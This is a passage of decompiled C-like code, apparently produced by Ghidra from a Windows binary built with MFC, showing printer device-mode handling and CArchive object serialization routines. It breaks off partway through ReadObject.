void __thiscall CWinApp::DevModeChange(CWinApp *this,wchar_t *param_1)

{
  LPVOID pvVar1;
  int iVar2;
  BOOL BVar3;
  SIZE_T dwBytes;
  HGLOBAL hMem;
  PDEVMODEW pDevModeOutput;
  LONG LVar4;
  CWinApp *local_8;
  
  if (*(HGLOBAL *)(this + 0x74) != (HGLOBAL)0x0) {
    local_8 = this;
    pvVar1 = GlobalLock(*(HGLOBAL *)(this + 0x74));
    iVar2 = lstrcmpW((LPCWSTR)((int)pvVar1 + (uint)*(ushort *)((int)pvVar1 + 2) * 2),param_1);
    if ((iVar2 == 0) &&
       (BVar3 = OpenPrinterW(param_1,&local_8,(LPPRINTER_DEFAULTSW)0x0), BVar3 != 0)) {
      if (*(void **)(this + 0x70) != (void *)0x0) {
        AfxGlobalFree(*(void **)(this + 0x70));
      }
      dwBytes = DocumentPropertiesW((HWND)0x0,local_8,param_1,(PDEVMODEW)0x0,(PDEVMODEW)0x0,0);
      hMem = GlobalAlloc(0x42,dwBytes);
      *(HGLOBAL *)(this + 0x70) = hMem;
      pDevModeOutput = (PDEVMODEW)GlobalLock(hMem);
      LVar4 = DocumentPropertiesW((HWND)0x0,local_8,param_1,pDevModeOutput,(PDEVMODEW)0x0,2);
      if (LVar4 != 1) {
        AfxGlobalFree(*(void **)(this + 0x70));
        *(undefined4 *)(this + 0x70) = 0;
      }
      ClosePrinter(local_8);
    }
  }
  return;
}



// Library Function - Single Match
//  int __stdcall AfxOleCanExitApp(void)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int AfxOleCanExitApp(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  return (uint)(*(int *)(pAVar1 + 0x2c) == 0);
}



// Library Function - Single Match
//  void __stdcall AfxOleLockApp(void)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

void AfxOleLockApp(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  InterlockedIncrement((LONG *)(pAVar1 + 0x2c));
  return;
}



void FUN_00413aa4(undefined4 param_1)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  *(undefined4 *)(pAVar1 + 0x30) = param_1;
  return;
}



void FUN_00413b04(void)

{
  int iVar1;
  int iVar2;
  AFX_MODULE_STATE *pAVar3;
  LONG LVar4;
  
  pAVar3 = AfxGetModuleState();
  LVar4 = InterlockedDecrement((LONG *)(pAVar3 + 0x2c));
  if (LVar4 != 0) {
    return;
  }
  pAVar3 = AfxGetModuleState();
  if (*(int *)(pAVar3 + 0x30) == 0) {
    FUN_00413aa4(1);
    pAVar3 = AfxGetModuleState();
    iVar1 = *(int *)(pAVar3 + 4);
    if ((iVar1 == 0) || (*(CWnd **)(iVar1 + 0x20) == (CWnd *)0x0)) {
      pAVar3 = AfxGetModuleState();
      if (pAVar3[0x14] == (AFX_MODULE_STATE)0x0) {
        AfxPostQuitMessage(0);
      }
    }
    else {
      iVar2 = CWnd::IsWindowEnabled(*(CWnd **)(iVar1 + 0x20));
      if (iVar2 != 0) {
                    // WARNING: Could not recover jumptable at 0x00413aed. Too many branches
                    // WARNING: Treating indirect jump as call
        (**(code **)(**(int **)(iVar1 + 0x20) + 0x60))();
        return;
      }
    }
  }
  return;
}



// Library Function - Single Match
//  public: enum CArchive::LoadArrayObjType & __thiscall CArray<enum CArchive::LoadArrayObjType,enum
// CArchive::LoadArrayObjType const &>::GetAt(int)
// 
// Library: Visual Studio 2008 Release

LoadArrayObjType * __thiscall
CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::GetAt
          (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *this,
          int param_1)

{
  code *pcVar1;
  LoadArrayObjType *pLVar2;
  
  if ((-1 < param_1) && (param_1 < *(int *)(this + 8))) {
    return (LoadArrayObjType *)(*(int *)(this + 4) + param_1 * 4);
  }
  AfxThrowNotSupportedException();
  pcVar1 = (code *)swi(3);
  pLVar2 = (LoadArrayObjType *)(*pcVar1)();
  return pLVar2;
}



// Library Function - Single Match
//  public: void * __thiscall CPtrArray::GetAt(int)const 
// 
// Library: Visual Studio 2008 Release

void * __thiscall CPtrArray::GetAt(CPtrArray *this,int param_1)

{
  code *pcVar1;
  void *pvVar2;
  
  if ((-1 < param_1) && (param_1 < *(int *)(this + 8))) {
    return *(void **)(*(int *)(this + 4) + param_1 * 4);
  }
  AfxThrowNotSupportedException();
  pcVar1 = (code *)swi(3);
  pvVar2 = (void *)(*pcVar1)();
  return pvVar2;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::CheckCount(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::CheckCount(CArchive *this)

{
  if (0x3ffffffd < *(uint *)(this + 0x34)) {
    AfxThrowArchiveException(5,*(wchar_t **)(this + 0x14));
  }
  return;
}



void __fastcall FUN_00413b73(undefined4 *param_1)

{
  *param_1 = CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::vftable
  ;
  param_1[1] = 0;
  param_1[4] = 0;
  param_1[3] = 0;
  param_1[2] = 0;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArray<enum CArchive::LoadArrayObjType,enum CArchive::LoadArrayObjType
// const &>::SetSize(int,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall
CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::SetSize
          (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *this,
          int param_1,int param_2)

{
  int iVar1;
  void *pvVar2;
  int iVar3;
  int iVar4;
  
  iVar1 = param_1;
  if (-1 < param_1) goto LAB_00413b9f;
  do {
    AfxThrowNotSupportedException();
LAB_00413b9f:
    if (-1 < param_2) {
      *(int *)(this + 0x10) = param_2;
    }
    if (iVar1 == 0) {
      if (*(void **)(this + 4) != (void *)0x0) {
        FUN_0040a3fc(*(void **)(this + 4));
        *(undefined4 *)(this + 4) = 0;
      }
      *(undefined4 *)(this + 0xc) = 0;
      *(undefined4 *)(this + 8) = 0;
      return;
    }
    if (*(int *)(this + 4) == 0) {
      iVar4 = *(int *)(this + 0x10);
      if (*(int *)(this + 0x10) < iVar1) {
        iVar4 = iVar1;
      }
      pvVar2 = operator_new(iVar4 << 2);
      *(void **)(this + 4) = pvVar2;
      _memset(pvVar2,0,iVar4 << 2);
      *(int *)(this + 0xc) = iVar4;
      goto LAB_00413cbb;
    }
    iVar4 = *(int *)(this + 0xc);
    if (iVar1 <= iVar4) {
      iVar4 = *(int *)(this + 8);
      if (iVar4 < iVar1) {
        _memset((void *)(*(int *)(this + 4) + iVar4 * 4),0,(iVar1 - iVar4) * 4);
      }
      goto LAB_00413cbb;
    }
    iVar3 = *(int *)(this + 0x10);
    if (iVar3 == 0) {
      iVar3 = (int)(*(int *)(this + 8) + (*(int *)(this + 8) >> 0x1f & 7U)) >> 3;
      if (iVar3 < 4) {
        iVar3 = 4;
      }
      else if (0x400 < iVar3) {
        iVar3 = 0x400;
      }
    }
    param_1 = iVar3 + iVar4;
    if (iVar3 + iVar4 <= iVar1) {
      param_1 = iVar1;
    }
  } while (param_1 < iVar4);
  pvVar2 = operator_new(param_1 << 2);
  FUN_0040be3a(pvVar2,param_1 << 2,*(void **)(this + 4),*(int *)(this + 8) << 2);
  _memset((void *)((int)pvVar2 + *(int *)(this + 8) * 4),0,(iVar1 - *(int *)(this + 8)) * 4);
  FUN_0040a3fc(*(void **)(this + 4));
  *(void **)(this + 4) = pvVar2;
  *(int *)(this + 0xc) = param_1;
LAB_00413cbb:
  *(int *)(this + 8) = iVar1;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArray<enum CArchive::LoadArrayObjType,enum CArchive::LoadArrayObjType
// const &>::InsertAt(int,enum CArchive::LoadArrayObjType const &,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall
CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::InsertAt
          (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *this,
          int param_1,LoadArrayObjType *param_2,int param_3)

{
  code *pcVar1;
  int iVar2;
  uint uVar3;
  
  if ((-1 < param_1) && (0 < param_3)) {
    if (param_1 < *(int *)(this + 8)) {
      iVar2 = *(int *)(this + 8);
      SetSize(this,iVar2 + param_3,-1);
      uVar3 = (iVar2 - param_1) * 4;
      ATL::Checked::memmove_s
                ((void *)(*(int *)(this + 4) + (param_1 + param_3) * 4),uVar3,
                 (void *)(*(int *)(this + 4) + param_1 * 4),uVar3);
      _memset((void *)(*(int *)(this + 4) + param_1 * 4),0,param_3 << 2);
    }
    else {
      SetSize(this,param_1 + param_3,-1);
    }
    iVar2 = param_1 << 2;
    do {
      param_3 = param_3 + -1;
      *(LoadArrayObjType *)(iVar2 + *(int *)(this + 4)) = *param_2;
      iVar2 = iVar2 + 4;
    } while (param_3 != 0);
    return;
  }
  AfxThrowNotSupportedException();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __fastcall FUN_00413d65(undefined4 *param_1)

{
  *param_1 = CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::vftable
  ;
  if ((void *)param_1[1] != (void *)0x0) {
    FUN_0040a3fc((void *)param_1[1]);
  }
  return;
}



undefined4 * __thiscall FUN_00413d7a(void *this,byte param_1)

{
  FUN_00413d65((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// Library Function - Multiple Matches With Same Base Name
//  void __stdcall SerializeElements<int>(class CArchive &,int *,int)
//  void __stdcall SerializeElements<struct HWND__ *>(class CArchive &,struct HWND__ * *,int)
//  void __stdcall SerializeElements<enum CArchive::LoadArrayObjType>(class CArchive &,enum
// CArchive::LoadArrayObjType *,int)
// 
// Library: Visual Studio 2008 Release

void SerializeElements<>(CArchive *param_1,void *param_2,uint param_3)

{
  void *extraout_ECX;
  uint uVar1;
  
  if ((param_3 != 0) && (param_2 == (void *)0x0)) {
    AfxThrowNotSupportedException();
    param_2 = extraout_ECX;
  }
  if ((~*(uint *)(param_1 + 0x18) & 1) == 0) {
    for (; param_3 != 0; param_3 = param_3 - uVar1) {
      uVar1 = 0x1fffffff;
      if (param_3 < 0x1fffffff) {
        uVar1 = param_3;
      }
      CArchive::EnsureRead(param_1,param_2,uVar1 * 4);
      param_2 = (void *)((int)param_2 + uVar1 * 4);
    }
  }
  else {
    for (; param_3 != 0; param_3 = param_3 - uVar1) {
      uVar1 = 0x1fffffff;
      if (param_3 < 0x1fffffff) {
        uVar1 = param_3;
      }
      CArchive::Write(param_1,param_2,uVar1 * 4);
      param_2 = (void *)((int)param_2 + uVar1 * 4);
    }
  }
  return;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void __fastcall FUN_00413e23(int param_1)

{
  CMapPtrToPtr *pCVar1;
  int iVar2;
  undefined4 *puVar3;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> **ppCVar4;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *this;
  void *local_1c;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *local_18;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x1c;
  local_8 = 0x413e2f;
  pCVar1 = *(CMapPtrToPtr **)(param_1 + 0x3c);
  this = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)0x0;
  local_1c = (void *)0x0;
  if (pCVar1 == (CMapPtrToPtr *)0x0) {
    pCVar1 = (CMapPtrToPtr *)operator_new(0x1c);
    local_8 = 0;
    if (pCVar1 == (CMapPtrToPtr *)0x0) {
      pCVar1 = (CMapPtrToPtr *)0x0;
    }
    else {
      pCVar1 = (CMapPtrToPtr *)CMapPtrToPtr::CMapPtrToPtr(pCVar1,10);
    }
    local_8 = 0xffffffff;
  }
  iVar2 = CMapPtrToPtr::Lookup(pCVar1,(void *)0x1,&local_1c);
  if (iVar2 == 0) {
    puVar3 = (undefined4 *)operator_new(0x14);
    if (puVar3 != (undefined4 *)0x0) {
      this = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
             FUN_00413b73(puVar3);
    }
    local_8 = 1;
    local_18 = this;
    CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::SetSize
              (this,1,*(int *)(param_1 + 0x40));
    ppCVar4 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> **)
              CMapPtrToPtr::operator[](pCVar1,(void *)0x1);
    *ppCVar4 = this;
    FUN_00413ee0();
    return;
  }
  local_18 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
             local_1c;
  FUN_00413ee0();
  return;
}



undefined * Catch_00413ec2(void)

{
  int unaff_EBP;
  
  if (*(int **)(unaff_EBP + -0x1c) != (int *)0x0) {
    (**(code **)(**(int **)(unaff_EBP + -0x1c) + 4))(1);
  }
  *(undefined4 *)(unaff_EBP + -0x14) = 0;
  return &DAT_00413eda;
}



// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

void FUN_00413ee0(void)

{
  undefined4 *puVar1;
  int unaff_EBX;
  int unaff_EBP;
  undefined4 unaff_ESI;
  
  puVar1 = *(undefined4 **)(unaff_EBP + 8);
  *(undefined4 *)(unaff_EBX + 0x3c) = unaff_ESI;
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = *(undefined4 *)(unaff_EBP + -0x14);
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: void __thiscall CArchive::MapObject(class CObject const *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::MapObject(CArchive *this,CObject *param_1)

{
  CMapPtrToPtr *this_00;
  void **ppvVar1;
  CPtrArray *this_01;
  int iVar2;
  CMapPtrToPtr *local_1c;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *local_18;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0xc;
  local_8 = 0x413f03;
  if ((~(byte)*(undefined4 *)(this + 0x18) & 1) == 0) {
    if (*(int *)(this + 0x38) != 0) goto LAB_00413fe5;
    local_1c = (CMapPtrToPtr *)operator_new(0x14);
    local_8 = 1;
    if (local_1c == (CMapPtrToPtr *)0x0) {
      this_01 = (CPtrArray *)0x0;
    }
    else {
      this_01 = (CPtrArray *)CPtrArray::CPtrArray((CPtrArray *)local_1c);
    }
    local_8 = 0xffffffff;
    *(CPtrArray **)(this + 0x38) = this_01;
    CPtrArray::SetSize(this_01,1,*(int *)(this + 0x40));
    iVar2 = *(int *)(this + 0x38);
    if (0 < *(int *)(iVar2 + 8)) goto LAB_00413fbe;
    do {
      AfxThrowNotSupportedException();
LAB_00413fbe:
      **(undefined4 **)(iVar2 + 4) = 0;
      *(undefined4 *)(this + 0x34) = 1;
      local_14 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                 0x0;
      FUN_00413e23((int)this);
      local_1c = (CMapPtrToPtr *)0x0;
      CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::InsertAt
                (local_14,0,(LoadArrayObjType *)&local_1c,1);
LAB_00413fe5:
      if (param_1 == (CObject *)0x0) {
        return;
      }
      CheckCount(this);
      CPtrArray::InsertAt(*(CPtrArray **)(this + 0x38),*(int *)(this + 0x34),param_1,1);
      local_18 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                 0x0;
      iVar2 = CMapPtrToPtr::Lookup(*(CMapPtrToPtr **)(this + 0x3c),(void *)0x1,&local_18);
    } while (local_18 ==
             (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)0x0);
    param_1 = (CObject *)0x2;
    CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::InsertAt
              (local_18,*(int *)(this + 0x34),(LoadArrayObjType *)&param_1,1);
  }
  else {
    if (*(int *)(this + 0x38) == 0) {
      local_1c = (CMapPtrToPtr *)operator_new(0x1c);
      local_8 = 0;
      if (local_1c == (CMapPtrToPtr *)0x0) {
        this_00 = (CMapPtrToPtr *)0x0;
      }
      else {
        this_00 = (CMapPtrToPtr *)CMapPtrToPtr::CMapPtrToPtr(local_1c,*(int *)(this + 0x40));
      }
      local_8 = 0xffffffff;
      *(CMapPtrToPtr **)(this + 0x38) = this_00;
      CMapPtrToPtr::InitHashTable(this_00,*(uint *)(this + 0x44),1);
      ppvVar1 = CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x38),(void *)0x0);
      *ppvVar1 = (void *)0x0;
      *(undefined4 *)(this + 0x34) = 1;
    }
    if (param_1 == (CObject *)0x0) {
      return;
    }
    CheckCount(this);
    ppvVar1 = CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x38),param_1);
    *ppvVar1 = *(void **)(this + 0x34);
  }
  *(int *)(this + 0x34) = *(int *)(this + 0x34) + 1;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::WriteClass(struct CRuntimeClass const *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::WriteClass(CArchive *this,CRuntimeClass *param_1)

{
  void *pvVar1;
  void **ppvVar2;
  CArchive *extraout_ECX;
  CArchive *extraout_ECX_00;
  CArchive *this_00;
  undefined4 uVar3;
  wchar_t *pwVar4;
  
  this_00 = this;
  if (param_1 != (CRuntimeClass *)0x0) goto LAB_00414051;
  pwVar4 = *(wchar_t **)(this + 0x14);
  uVar3 = 6;
  while( true ) {
    AfxThrowArchiveException(uVar3,pwVar4);
    this_00 = extraout_ECX;
LAB_00414051:
    if ((~*(uint *)(this + 0x18) & 1) != 0) break;
    pwVar4 = *(wchar_t **)(this + 0x14);
    uVar3 = 1;
  }
  if (*(int *)(param_1 + 8) == 0xffff) {
    AfxThrowNotSupportedException();
    this_00 = extraout_ECX_00;
  }
  MapObject(this_00,(CObject *)0x0);
  ppvVar2 = CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x38),param_1);
  pvVar1 = *ppvVar2;
  if (pvVar1 == (void *)0x0) {
    operator<<(this,0xffff);
    CRuntimeClass::Store(param_1,this);
    CheckCount(this);
    ppvVar2 = CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x38),param_1);
    *ppvVar2 = *(void **)(this + 0x34);
    *(int *)(this + 0x34) = *(int *)(this + 0x34) + 1;
  }
  else if (pvVar1 < (void *)0x7fff) {
    operator<<(this,(ushort)pvVar1 | 0x8000);
  }
  else {
    operator<<(this,0x7fff);
    operator<<(this,(uint)pvVar1 | 0x80000000);
  }
  return;
}



// Library Function - Single Match
//  public: struct CRuntimeClass * __thiscall CArchive::ReadClass(struct CRuntimeClass const
// *,unsigned int *,unsigned long *)
// 
// Library: Visual Studio 2008 Release

CRuntimeClass * __thiscall
CArchive::ReadClass(CArchive *this,CRuntimeClass *param_1,uint *param_2,ulong *param_3)

{
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> **ppCVar1;
  LoadArrayObjType *pLVar2;
  int iVar3;
  CArchive *extraout_ECX;
  CArchive *extraout_ECX_00;
  CArchive *this_00;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *extraout_ECX_01;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *this_01;
  CRuntimeClass *this_02;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *pCVar4;
  undefined4 uVar5;
  wchar_t *pwVar6;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *local_14;
  uint local_10;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *local_c;
  CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *local_8;
  
  this_00 = this;
  if (((byte)this[0x18] & 1) != 0) goto LAB_00414102;
  pwVar6 = *(wchar_t **)(this + 0x14);
  uVar5 = 1;
LAB_004140fd:
  do {
    while( true ) {
      AfxThrowArchiveException(uVar5,pwVar6);
      this_00 = extraout_ECX;
LAB_00414102:
      this_02 = (CRuntimeClass *)0xffff;
      if ((param_1 != (CRuntimeClass *)0x0) && (*(int *)(param_1 + 8) == 0xffff)) {
        AfxThrowNotSupportedException();
        this_00 = extraout_ECX_00;
      }
      MapObject(this_00,(CObject *)0x0);
      operator>>(this,(ushort *)&local_8);
      if ((short)local_8 == 0x7fff) {
        operator>>(this,&local_10);
      }
      else {
        local_10 = ((uint)local_8 & 0x8000) << 0x10 | (uint)local_8 & 0x7fff;
      }
      if ((local_10 & 0x80000000) != 0) break;
      if (param_3 != (ulong *)0x0) {
        *param_3 = local_10;
        return (CRuntimeClass *)0x0;
      }
LAB_0041416d:
      pwVar6 = *(wchar_t **)(this + 0x14);
      uVar5 = 5;
    }
    if ((short)local_8 != -1) {
      pCVar4 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
               (local_10 & 0x7fffffff);
      if ((pCVar4 == (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>
                      *)0x0) ||
         ((CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
          (*(int *)(*(int *)(this + 0x38) + 8) + -1) < pCVar4)) goto LAB_0041416d;
      local_8 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                0x0;
      CMapPtrToPtr::Lookup(*(CMapPtrToPtr **)(this + 0x3c),(void *)0x1,&local_8);
      if (local_8 ==
          (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)0x0) {
LAB_00414205:
        AfxThrowNotSupportedException();
        this_01 = extraout_ECX_01;
        goto LAB_0041420a;
      }
      pLVar2 = CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::GetAt
                         (local_8,(int)pCVar4);
      if (*pLVar2 == 2) goto LAB_0041416d;
      this_02 = (CRuntimeClass *)CPtrArray::GetAt(*(CPtrArray **)(this + 0x38),(int)pCVar4);
      local_c = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                0x0;
      if ((*(CMapPtrToPtr **)(this + 0x3c) == (CMapPtrToPtr *)0x0) ||
         (iVar3 = CMapPtrToPtr::Lookup(*(CMapPtrToPtr **)(this + 0x3c),this_02,&local_8),
         local_c = local_8, iVar3 == 0)) {
        local_c = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                  (*(uint *)(this_02 + 8) & 0x7fffffff);
      }
LAB_0041429b:
      if ((param_1 == (CRuntimeClass *)0x0) ||
         (iVar3 = CRuntimeClass::IsDerivedFrom(this_02,param_1), iVar3 != 0)) {
        if (param_2 == (uint *)0x0) {
          *(CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> **)
           (this + 0x10) = local_c;
        }
        else {
          *param_2 = (uint)local_c;
        }
        if (param_3 != (ulong *)0x0) {
          *param_3 = local_10;
        }
        return this_02;
      }
LAB_00414197:
      pwVar6 = *(wchar_t **)(this + 0x14);
      uVar5 = 6;
      goto LAB_004140fd;
    }
    this_02 = CRuntimeClass::Load(this,(uint *)&local_c);
    if (this_02 == (CRuntimeClass *)0x0) goto LAB_00414197;
    if ((CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
        (*(uint *)(this_02 + 8) & 0x7fffffff) == local_c) {
LAB_004141d6:
      CheckCount(this);
      pCVar4 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)0x1
      ;
      CPtrArray::InsertAt(*(CPtrArray **)(this + 0x38),*(int *)(this + 0x34),this_02,1);
      local_14 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
                 0x0;
      CMapPtrToPtr::Lookup(*(CMapPtrToPtr **)(this + 0x3c),(void *)0x1,&local_14);
      this_01 = local_14;
      if (local_14 ==
          (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)0x0)
      goto LAB_00414205;
LAB_0041420a:
      local_8 = pCVar4;
      CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::InsertAt
                (this_01,*(int *)(this + 0x34),(LoadArrayObjType *)&local_8,(int)pCVar4);
      *(int *)(this + 0x34) = *(int *)(this + 0x34) + 1;
      goto LAB_0041429b;
    }
    if ((*(uint *)(this_02 + 8) & 0x80000000) != 0) {
      FUN_00413e23((int)this);
      pCVar4 = local_c;
      ppCVar1 = (CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> **)
                CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x3c),this_02);
      *ppCVar1 = pCVar4;
      goto LAB_004141d6;
    }
    pwVar6 = *(wchar_t **)(this + 0x14);
    uVar5 = 7;
  } while( true );
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual void __thiscall CArray<int,int const &>::Serialize(class CArchive &)
//  public: virtual void __thiscall CArray<struct HWND__ *,struct HWND__ *>::Serialize(class
// CArchive &)
//  public: virtual void __thiscall CArray<enum CArchive::LoadArrayObjType,enum
// CArchive::LoadArrayObjType const &>::Serialize(class CArchive &)
// 
// Library: Visual Studio 2008 Release

void __thiscall Serialize(void *this,CArchive *param_1)

{
  ulong uVar1;
  
  if ((~*(uint *)(param_1 + 0x18) & 1) == 0) {
    uVar1 = CArchive::ReadCount(param_1);
    CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&>::SetSize
              ((CArray<enum_CArchive::LoadArrayObjType,enum_CArchive::LoadArrayObjType_const&> *)
               this,uVar1,-1);
  }
  else {
    CArchive::WriteCount(param_1,*(ulong *)((int)this + 8));
  }
  SerializeElements<>(param_1,*(void **)((int)this + 4),*(uint *)((int)this + 8));
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::WriteObject(class CObject const *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::WriteObject(CArchive *this,CObject *param_1)

{
  void *pvVar1;
  void **ppvVar2;
  CRuntimeClass *pCVar3;
  CArchive *extraout_ECX;
  CArchive *this_00;
  
  this_00 = this;
  if ((~*(uint *)(this + 0x18) & 1) == 0) {
    AfxThrowArchiveException(2,*(wchar_t **)(this + 0x14));
    this_00 = extraout_ECX;
  }
  MapObject(this_00,(CObject *)0x0);
  if (param_1 == (CObject *)0x0) {
    operator<<(this,0);
  }
  else {
    ppvVar2 = CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x38),param_1);
    pvVar1 = *ppvVar2;
    if (pvVar1 == (void *)0x0) {
      pCVar3 = (CRuntimeClass *)(***(code ***)param_1)();
      WriteClass(this,pCVar3);
      CheckCount(this);
      ppvVar2 = CMapPtrToPtr::operator[](*(CMapPtrToPtr **)(this + 0x38),param_1);
      *ppvVar2 = *(void **)(this + 0x34);
      *(int *)(this + 0x34) = *(int *)(this + 0x34) + 1;
      (**(code **)(*(int *)param_1 + 8))(this);
    }
    else if (pvVar1 < (void *)0x7fff) {
      operator<<(this,(ushort)pvVar1);
    }
    else {
      operator<<(this,0x7fff);
      operator<<(this,(ulong)pvVar1);
    }
  }
  return;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: class CObject * __thiscall CArchive::ReadObject(struct CRuntimeClass const *)
// 
// Library: Visual Studio 2008 Release

CObject * __thiscall CArchive::ReadObject(CArchive *this,CRuntimeClass *param_1)

{
  CRuntimeClass *this_00;
  int iVar1;
  LoadArrayObjType *pLVar2;
  CObject *this_01;
  int *piVar3;
  CArchive *extraout_ECX;
  CArchive *this_02;
  int *extraout_ECX_00;
  int *this_03;
  undefined4 uVar4;
  wchar_t *pwVar5;
  uint local_20;
  int *local_1c;
  int *local_18 [4];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x14;
  local_8 = 0x4143c3;
  this_02 = this;
  if (((byte)this[0x18] & 1) != 0) goto LAB_004143d5;
  pwVar5 = *(wchar_t **)(this + 0x14);
  uVar4 = 4;
  do {
    while( true ) {
      AfxThrowArchiveException(uVar4,pwVar5);
      this_02 = extraout_ECX;
LAB_004143d5:
      this_00 = ReadClass(this_02,param_1,&local_20,(ulong *)&local_1c);
      piVar3 = local_1c;
      local_18[0] = (int *)0x0;
      if (this_00 != (CRuntimeClass *)0x0) break;
      if ((int *)(*(int *)(*(int *)(this + 0x38) + 8) + -1) < local_1c) goto LAB_00414400;
      local_18[0] = (int *)0x0;
      iVar1 = CMapPtrToPtr::Lookup(*(CMapPtrToPtr **)(this + 0x3c),(void *)0x1,local_18);
      if (iVar1 != 0) {
        this_03 = local_18[0];
        if (local_18[0] == (int *)0x0) goto LAB_00414423;
        goto LAB_00414428;
      }
